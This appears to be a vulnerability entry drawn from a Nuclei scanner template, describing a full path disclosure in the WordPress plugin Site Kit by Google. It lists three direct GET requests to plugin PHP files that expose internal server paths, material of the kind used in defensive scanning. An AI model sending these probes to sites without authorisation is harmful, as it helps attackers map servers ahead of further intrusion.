# Vulnerability: WordPress Plugin Site Kit by Google - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wp-google-site-kit-fpd.yaml`)

## Description
WordPress plugin Site Kit by Google internal file system path is exposed.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/google-site-kit/includes/Core/Admin_Bar/Admin_Bar.php
GET {{BaseURL}}/wp-content/plugins/google-site-kit/includes/Core/Authentication/Authentication.php
GET {{BaseURL}}/wp-content/plugins/google-site-kit/third-party/google/apiclient-services/src/Google/Service/AdSense/Resource/Accounts.php
```

